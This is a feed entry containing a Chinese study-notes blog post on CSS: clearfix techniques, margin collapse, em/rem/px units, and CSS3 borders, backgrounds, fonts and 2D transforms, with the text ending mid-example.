  <entry>
    <title>CSS属性(第十二天)</title>
    <link href="https://merlynr.github.io/2022/08/05/CSS%E5%B1%9E%E6%80%A7(%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/05/CSS%E5%B1%9E%E6%80%A7(%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%A4%A9)/</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2022-08-04T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h1><p>清除浮动其实叫做闭合浮动更合适，因为是把浮动的元素圈起来，让父元素闭合出口和入口不让他们出来影响其他的元素。<br>在CSS中，clear属性用于清除浮动，其基本语法格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">选择器&#123;clear:属性值;&#125;</span><br><span class="line">/*属性值为left,清除左侧浮动的影响</span><br><span class="line">  属性值为right,清除右侧浮动的影响</span><br><span class="line">  属性值为both,同时清除左右两侧浮动的影响*/</span><br></pre></td></tr></table></figure><h2 id="额外标签法"><a href="#额外标签法" class="headerlink" title="额外标签法"></a>额外标签法</h2><ol><li>末尾标签法</li></ol><p>通过在浮动元素的末尾添加一个空的标签。这是W3C推荐的做法，虽然比较简单，但是添加了无意义的标 签，结构化比较差，所以不推荐使用。下面三种写法都适用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;div style=&quot;clear:both&quot;&gt;&lt;/div&gt;</span><br><span class="line">2. .clear &#123; clear:both &#125;</span><br><span class="line">    &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;</span><br><span class="line">3..clear&#123; clear:both &#125;</span><br><span class="line">    &lt;br class=&quot;clear&quot; /&gt;    &lt;!--也可以使用br等别的块级元素来清除浮动--&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>内部标签法，把div放进父盒子里，盒子会撑开，一般也不会用。</li></ol><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>给父级元素添加overflow样式方法。<br>代码比较简洁，可以通过触发BFC方式，但是<font color="#FF00FF">因为本身overflow的本质是溢出隐藏的效果</font>，所以有的时候也会有<font color="#FF00FF">一些问题存在，比如内容增多的时候不会自动换行导致内容被隐藏掉，无法显示出要溢出的元素</font>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.father &#123;</span><br><span class="line">        overflow: auto;  </span><br><span class="line">      /* 加上这句话，就可以清除浮动   overflow = hidden|auto|scroll 都可以实现*/</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="伪元素法（最常用）"><a href="#伪元素法（最常用）" class="headerlink" title="伪元素法（最常用）"></a>伪元素法（最常用）</h2><ol><li>使用after伪元素清除浮动</li></ol><p>after是在父元素中加一个盒子，这个元素是通过css添加上去的，符合闭合浮动思想，结构语义化正确。<br>父元素中加一个类名为clearfix 。但是这个方法IE6，7不识别，要进行兼容，使用zoom:1触发 hasLayout来清除浮动<br>代表网站：百度、淘宝、网易等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.clearfix:after&#123;</span><br><span class="line">    content:&quot;.&quot;;  /*尽量不要为空，一般写一个点*/</span><br><span class="line">    height:0;     /*盒子高度为0，看不见*/</span><br><span class="line">    display:block;    /*插入伪元素是行内元素，要转化为块级元素*/</span><br><span class="line">    visibility:hidden;      /*content有内容，将元素隐藏*/</span><br><span class="line">    clear:both;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.clearfix &#123;</span><br><span class="line">    *zoom: 1;   /*  *只有IE6,7识别 */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>after伪元素空余字符法</li></ol><p>父元素中加一个类名为clearfix，也需要兼容IE6、7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.clearfix::after&#123;</span><br><span class="line">    content:&quot;\200B&quot;;   /* content:&#x27;\0200&#x27;; 也可以 */</span><br><span class="line">    display:block;</span><br><span class="line">    height:0;</span><br><span class="line">    clear:both;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.clearfix &#123;</span><br><span class="line">    *zoom: 1; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>使用before和after双伪元素清除浮动<font color="#FF00FF">（推荐）</font></li></ol><p>完全符合闭合浮动思想的方法。<br>父元素中加一个类名为clearfix,需要兼容IE6、7<br>代表网站：小米、腾讯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.clearfix:before, .clearfix:after &#123;</span><br><span class="line">       content: &quot;&quot;; </span><br><span class="line">       display: table;</span><br><span class="line">   &#125;</span><br><span class="line">   .clearfix:after &#123;</span><br><span class="line">       clear: both;</span><br><span class="line">   &#125;</span><br><span class="line">   .clearfix &#123;</span><br><span class="line">       *zoom: 1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="padding-margin-百分比单位依据"><a href="#padding-margin-百分比单位依据" class="headerlink" title="padding , margin 百分比单位依据"></a>padding , margin 百分比单位依据</h1><p>在CSS 盒模型中，依据CSS2.2文档，<font color="#FF00FF">margin与padding的百分比指定值时，一律参考包含盒的宽度。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.father&#123;</span><br><span class="line">    height: 100px;</span><br><span class="line">    width: 200px;</span><br><span class="line">    border: solid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.son&#123;</span><br><span class="line">    margin: 20%;</span><br><span class="line">    padding: 20%;</span><br><span class="line">    width: 50%;</span><br><span class="line">    height: 50%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下图，包括padding-top/bottom,margin-top/bottom在内，所有padding和margin均是参考的包含块的宽度，故它们的值为200px * 20% = 40px。</p><h1 id="父子边距重合"><a href="#父子边距重合" class="headerlink" title="父子边距重合"></a>父子边距重合</h1><p><strong>效果：</strong><br>边界重叠是指两个或多个盒子(可能相邻也可能嵌套)的相邻边界(其间没有任何非空内容、补白、边框)重合在一起而形成一个单一边界。<br><strong>父子元素的边界重叠</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  .parent &#123;</span><br><span class="line">    background: #e7a1c5;</span><br><span class="line">  &#125;</span><br><span class="line">  .parent .child &#123;</span><br><span class="line">    background: #c8cdf5;</span><br><span class="line">    height: 100px;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;section class=&quot;parent&quot;&gt;</span><br><span class="line">  &lt;article class=&quot;child&quot;&gt;&lt;/article&gt;</span><br><span class="line">&lt;/section&gt;</span><br></pre></td></tr></table></figure><p><img src="http://files.shanqianche.cn/20228/1659687771174.png" alt="以为期待的效果"></p><p><img src="http://files.shanqianche.cn/20228/1659687834728.png" alt="而实际上效果如下"><br><font color="#FF00FF">在这里父元素的高度不是 110px，而是 100px，在这里发生了高度坍塌。</font><br><strong>产生原因：</strong><br><font color="#FF8C00">如果块元素的margin-top与它的第一个子元素的margin-top之间没有border、padding、inlinecontent、clearance来分隔，或者块元素的 margin-bottom 与它的最后一个子元素的 margin-bottom 之间没有border、padding、inlinecontent、height、min-height、max-height分隔，那么外边距会塌陷</font>。子元素多余的外边距会被父元素的外边距截断。<br><strong>解决办法：</strong><br>父子元素的边界重叠得解决方案： 在父元素上加上 overflow:hidden;使其成为 BFC。</p><h1 id="css字体大小设置（三种）-em-rem-px"><a href="#css字体大小设置（三种）-em-rem-px" class="headerlink" title="css字体大小设置（三种）.em rem px"></a>css字体大小设置（三种）.em rem px</h1><h2 id="px（绝对长度单位）"><a href="#px（绝对长度单位）" class="headerlink" title="px（绝对长度单位）"></a>px（绝对长度单位）</h2><p>相信对于前端来说px这个单位是大家并不陌生，px这个单位，兼容性可以说是相当可以，大家对px的了解肯 定是没有很大的问题的。</p><h2 id="em（相对长度单位）"><a href="#em（相对长度单位）" class="headerlink" title="em（相对长度单位）"></a>em（相对长度单位）</h2><p><strong>使用：</strong></p><ol><li>浏览器的默认字体都是16px，那么<font color="#FF8C00">1em=16px</font>，以此类推计算12px=0.75em，10px=0.625em,2em=32px；</li><li>这样使用很复杂，很难很好的与px进行对应,也导致书写、使用、视觉的复杂(0.75em、0.625em全是小数点)</li><li>为了<font color="#FF00FF">简化font-size的换算，我们在body中写入一下代码</font></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body &#123;font-size: 62.5%;  &#125; /*  公式16px*62.5%=10px  */ </span><br></pre></td></tr></table></figure><p>这样页面中1em=10px,1.2em=12px,1.4em=14px,1.6em=16px，使得视觉、使用、书写都得到了极大的帮助。<br>例子如下：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="keyword">class</span>=<span class="string">&quot;font1&quot;</span> style=<span class="string">&#x27;font-size:1.6em&#x27;</span>&gt;我是<span class="number">1.6</span>em&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>缺点：</strong></p><ul><li>em的值并不是固定的；</li><li>em会<font color="#FF00FF">继承父级元素的字体大小</font>（参考物是<font color="#FF00FF">父元素的font-size</font>；）；</li><li>em中所有的字体都是相对于父元素的大小决定的；所以如果一个设置了font-size:1.2em的元素在另一个设置了font-size:1.2em的元素里，而这个元素又在另一个设置了font-size:1.2em的元素里，那么最后计算的结果是1.2X1.2X1.2=1.728em</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;big&quot;&gt;</span><br><span class="line">    我是大字体</span><br><span class="line">   &lt;div class=&quot;small&quot;&gt;我是小字体&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">     body &#123;font-size: 62.5%; &#125; /*  公式:16px*62.5%=10px  */ </span><br><span class="line">    .big&#123;font-size: 1.2em&#125;</span><br><span class="line">    .small&#123;font-size: 1.2em&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><strong>但运行结果small的字体大小为：1.2em*1.2em=1.44em</strong></p><h2 id="rem（相对长度单位）"><a href="#rem（相对长度单位）" class="headerlink" title="rem（相对长度单位）"></a>rem（相对长度单位）</h2><p><strong>使用：</strong></p><ul><li>浏览器的默认字体都是16px，那么1rem=16px，以此类推计算12px=0.75rem，10px=0.625rem，2rem=32px；</li><li>这样使用很复杂，很难很好的与px进行对应,也导致书写、使用、视觉的复杂(0.75rem、0.625em全是小数点) ；</li><li>为了简化font-size的换算，<font color="#FF8C00">我们在根元素html中加入font-size: 62.5%;</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html &#123;font-size: 62.5%;  &#125; /*  公式16px*62.5%=10px  */  </span><br></pre></td></tr></table></figure><p>这样页面中1rem=10px,1.2rem=12px,1.4rem=14px,1.6rem=16px;使得视觉、使用、书写都得到了极大的帮助；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;font1&quot; style=&#x27;font-size:1.6rem&#x27;&gt;我是1.6rem=16px&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><strong>特点：</strong></p><ul><li>rem单位可谓集相对大小和绝对大小的优点于一身</li><li><font color="#FF8C00">和em不同的是rem总是相对于根元素(如:root{})，而不像em一样使用级联的方式来计算尺寸。这种相对单位使用起来更简单</font>。</li><li><font color="#FF8C00">rem支持IE9及以上，意思是相对于根元素html（网页），不会像em那样，依赖于父元素的字体大小，而造成混乱</font>。使用起来安全了很多。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;big&quot;&gt;</span><br><span class="line">    我是14px=1.4rem&lt;div class=&quot;small&quot;&gt;我是12px=1.2rem&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    html &#123;font-size: 10px;  &#125; /*  公式16px*62.5%=10px  */  </span><br><span class="line">    .big&#123;font-size: 1.4rem&#125;</span><br><span class="line">    .small&#123;font-size: 1.2rem&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意：</strong><br>值得注意的浏览器支持问<font color="#FF8C00">题： IE8，Safari 4或 iOS 3.2中不支持rem单位。</font><br>如果你的用户群都使用最新版的浏览器，那推荐使用rem，如果要考虑兼容性，那就使用px,或者两者同时使用。</p><h1 id="css3新特性-TODO-未完成"><a href="#css3新特性-TODO-未完成" class="headerlink" title="css3新特性 [TODO 未完成]"></a>css3新特性 [TODO 未完成]</h1><h2 id="CSS3-边框"><a href="#CSS3-边框" class="headerlink" title="CSS3 边框"></a>CSS3 边框</h2><h3 id="创建圆角"><a href="#创建圆角" class="headerlink" title="创建圆角"></a>创建圆角</h3><blockquote><p>语法： border-radius :number number;</p></blockquote><p>length： 由浮点数字和单位标识符组成的长度值（如：20px）。不可为负值，<font color="#FF8C00">如果为负值则与0展示效果一样</font>。<font color="#FF8C00">第一个值设置其水平半径，第二个值设置其垂直半径</font>，<em>如果第二个值省略则默认第二个值等于第一个值</em>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  border: 1px solid;</span><br><span class="line">  /* 设置每个圆角水平半径和垂直半径都为30px */</span><br><span class="line">  border-radius: 30px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>border-radius是4个角的缩写方法。四个角的表示顺序与border类似<font color="#FF8C00">按照border-top-left-radius、border-top-right-radius、border-bottom-right-radius、border-bottom-left-radius的顺序来设置</font>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  border: 1px solid;</span><br><span class="line">  /* 如果 / 前后的值都存在，那么 / 前面的值设置其水平半径，/ 后面值设置其垂直半径，如果没有 / ，则水平和垂直半径相等 */</span><br><span class="line">  border-radius: 10px 15px 20px 30px / 20px 30px 10px 15px;</span><br><span class="line"></span><br><span class="line">  /* 上面写法等价于下面的写法，第一个值是水平半径，第二个值是垂直半径 */</span><br><span class="line">  border-top-left-radius: 10px 20px;</span><br><span class="line">  border-top-right-radius: 15px 30px;</span><br><span class="line">  border-bottom-right-radius: 20px 10px;</span><br><span class="line">  border-bottom-left-radius: 30px 15px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>border-radius指定不同数量的值遵循对角相等的原则，即指定了值的取指定值，没有指定值的与对角值相等，对角相等模型</p><h3 id="边框阴影"><a href="#边框阴影" class="headerlink" title="边框阴影"></a>边框阴影</h3><p>通过属性box-shadow向边框添加阴影。<br>语法： {box-shadow : [inset] x-offset y-offset blur-radius extension-radius spread-radiuscolor}<br>说明：<strong>对象选择器 {box-shadow:[投影方式] X轴偏移量 Y轴偏移量 模糊半径 阴影扩展半径 阴影颜色}</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  /* 内阴影，向右偏移10px，向下偏移10px，模糊半径5px，阴影缩小10px */</span><br><span class="line">  box-shadow: inset 10px 10px 5px -10px #888888;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="边框图片"><a href="#边框图片" class="headerlink" title="边框图片"></a>边框图片</h3><p>语法：<br><strong>border-image : border-image-source || border-image-slice [ / border-image-width] || border-image-repeat</strong><br>border-image ： none | image [ number | percentage]{1,4} [ / border-width&gt;{1,4} ] ? [ stretch | repeat | round ]{0,2}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  border-image:url(border.png) 30 30 round;</span><br><span class="line"></span><br><span class="line">  border-image: url(border.png) 20/10px repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS3-背景"><a href="#CSS3-背景" class="headerlink" title="CSS3 背景"></a>CSS3 背景</h2><h3 id="background-size属性"><a href="#background-size属性" class="headerlink" title="background-size属性"></a>background-size属性</h3><p>在 CSS3 之前，背景图片的尺寸是由图片的实际尺寸决定的。在 CSS3 中，可以设置背景图片的尺寸，这就允许我们在不同的环境中重复使用背景图片。可以像素或百分比规定尺寸。<strong>如果以百分比规定尺寸，那么尺寸相对于父元素的宽度和高度。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  background:url(bg_flower.gif);</span><br><span class="line">  /* 通过像素规定尺寸 */</span><br><span class="line">  background-size:63px 100px;</span><br><span class="line"></span><br><span class="line">  /* 通过百分比规定尺寸 */</span><br><span class="line">  background-size:100% 50%;</span><br><span class="line">  background-repeat:no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="background-origin属性"><a href="#background-origin属性" class="headerlink" title="background-origin属性"></a>background-origin属性</h3><p>规定背景图片的定位区域，背景图片可以放置于content-box、padding-box或border-box区域，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  background:url(bg_flower.gif);</span><br><span class="line">  background-repeat:no-repeat;</span><br><span class="line">  background-size:100% 100%;</span><br><span class="line">  /* 规定背景图片的定位区域 */</span><br><span class="line">  background-origin:content-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="background-clip属性"><a href="#background-clip属性" class="headerlink" title="background-clip属性"></a>background-clip属性</h3><p>与background-origin属性相似，规定背景颜色的绘制区域，区域划分与background-origin属性相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  background-color:yellow;</span><br><span class="line">  background-clip:content-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS3-多重背景图片"><a href="#CSS3-多重背景图片" class="headerlink" title="CSS3 多重背景图片"></a>CSS3 多重背景图片</h3><p>CSS3 允许为元素设置多个背景图像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">  background-image:url(bg_flower.gif),url(bg_flower_2.gif);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS3-文本效果"><a href="#CSS3-文本效果" class="headerlink" title="CSS3 文本效果"></a>CSS3 文本效果</h2><ol><li>text-shadow属性</li></ol><p>给为本添加阴影，能够<font color="#FF8C00">设置水平阴影、垂直阴影、模糊距离，以及阴影的颜色。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">h1&#123;</span><br><span class="line">  text-shadow: 5px 5px 5px #FF0000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>text-wrap 属性</li></ol><p>设置区域内的<font color="#FF00FF">自动换行。</font><br>语法：text-wrap: normal | none | unrestricted | suppress | break-word;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* 允许对长单词进行拆分，并换行到下一行 */</span><br><span class="line">p &#123;word-wrap:break-word;&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>normal</td><td>只在允许的换行点进行换行。</td></tr><tr><td>none</td><td>不换行。元素无法容纳的文本会溢出。</td></tr><tr><td>break-word</td><td>在任意两个字符间换行。</td></tr><tr><td>suppress</td><td>压缩元素中的换行。<font color="#FF00FF">浏览器只在行中没有其他有效换行点时进行换行。</font></td></tr></tbody></table><h2 id="CSS3-字体"><a href="#CSS3-字体" class="headerlink" title="CSS3 字体"></a>CSS3 字体</h2><ol><li>字体定义</li></ol><p><font color="#FF8C00">在 CSS3 之前，web 设计师必须使用已在用户计算机上安装好的字体。但是通过 CSS3，web 设计师可以使用他 们喜欢的任意字体。当找到或购买到希望使用的字体时，可将该字体文件存放到 web 服务器上，它会在需要时 被自动下载到用户的计算机上。</font>字体<font color="#FF00FF">需要在 CSS3 @font-face 规则</font>中定义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* 定义字体 */</span><br><span class="line">@font-face&#123;</span><br><span class="line">  font-family: myFont;</span><br><span class="line">  src: url(&#x27;Sansation_Light.ttf&#x27;),</span><br><span class="line">       url(&#x27;Sansation_Light.eot&#x27;);     /* IE9+ */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div&#123;</span><br><span class="line">  font-family:myFont;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>使用粗体字体</li></ol><p>“Sansation_Light.ttf”文件 是定义的正常字体，”Sansation_Bold.ttf” 是另一个字体文件，它包含了 Sansation 字体的粗体字符。<font color="#FF8C00">只要 font-family 为 “myFirstFont” 的文本需要显示为粗体，浏览器就会使用该字体。</font><br><strong>（其实没弄清楚这样处理的原因，经测试直接在html中通过 b 标签也可以实现加粗的效果）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/* 定义正常字体 */</span><br><span class="line">@font-face&#123;</span><br><span class="line">  font-family: myFirstFont;</span><br><span class="line">  src: url(&#x27;/example/css3/Sansation_Light.ttf&#x27;),</span><br><span class="line">       url(&#x27;/example/css3/Sansation_Light.eot&#x27;); /* IE9+ */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 定义粗体时使用的字体 */</span><br><span class="line">@font-face&#123;</span><br><span class="line">  font-family: myFirstFont;</span><br><span class="line">  src: url(&#x27;/example/css3/Sansation_Bold.ttf&#x27;),</span><br><span class="line">       url(&#x27;/example/css3/Sansation_Bold.eot&#x27;); /* IE9+ */</span><br><span class="line">  /* 标识属性 */</span><br><span class="line">  font-weight:bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div&#123;</span><br><span class="line">  font-family:myFirstFont;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS3-2D-转换"><a href="#CSS3-2D-转换" class="headerlink" title="CSS3 2D 转换"></a>CSS3 2D 转换</h2><p>通过 CSS3 转换，我们能够对元素进行<strong>移动、缩放、转动、拉长或拉伸，转换</strong>是使元素改变形状、尺寸和位置的一种效果。</p><h4 id="translate-方法"><a href="#translate-方法" class="headerlink" title="translate() 方法"></a>translate() 方法</h4><p>通过 translate(x , y) 方法，元素根据给定的 left（x 坐标） 和 top（y 坐标） 位置参数<font color="#FF8C00">从其当前位置</font>移动，x为正值向右移动，为负值向左移动；y为正值向下移动，为负值向上移动；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  transform: translate(50px,100px);</span><br><span class="line">  -ms-transform: translate(50px,100px);        /* IE 9 */</span><br><span class="line">  -webkit-transform: translate(50px,100px);     /* Safari and Chrome */</span><br><span class="line">  -o-transform: translate(50px,100px);         /* Opera */</span><br><span class="line">  -moz-transform: translate(50px,100px);        /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rotate-方法"><a href="#rotate-方法" class="headerlink" title="rotate() 方法"></a>rotate() 方法</h3><p>控制元素顺时针旋转给定的角度。为正值，元素将顺时针旋转。为负值，元素将逆时针旋转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  transform: rotate(30deg);</span><br><span class="line">  -ms-transform: rotate(30deg);        /* IE 9 */</span><br><span class="line">  -webkit-transform: rotate(30deg);    /* Safari and Chrome */</span><br><span class="line">  -o-transform: rotate(30deg);         /* Opera */</span><br><span class="line">  -moz-transform: rotate(30deg);       /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="scale-方法"><a href="#scale-方法" class="headerlink" title="scale() 方法"></a>scale() 方法</h3><p>根据给定的宽度（X 轴）和高度（Y 轴）参数，<font color="#FF8C00">控制元素的尺寸的增加、减少。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  transform: scale(2,4);</span><br><span class="line">  -ms-transform: scale(2,4);         /* IE 9 */</span><br><span class="line">  -webkit-transform: scale(2,4);     /* Safari 和 Chrome */</span><br><span class="line">  -o-transform: scale(2,4);         /* Opera */</span><br><span class="line">  -moz-transform: scale(2,4);       /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="skew-方法"><a href="#skew-方法" class="headerlink" title="skew() 方法"></a>skew() 方法</h3><p><strong>根据给定的水平线（X 轴）和垂直线（Y 轴）参数设置元素翻转给定的角度。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 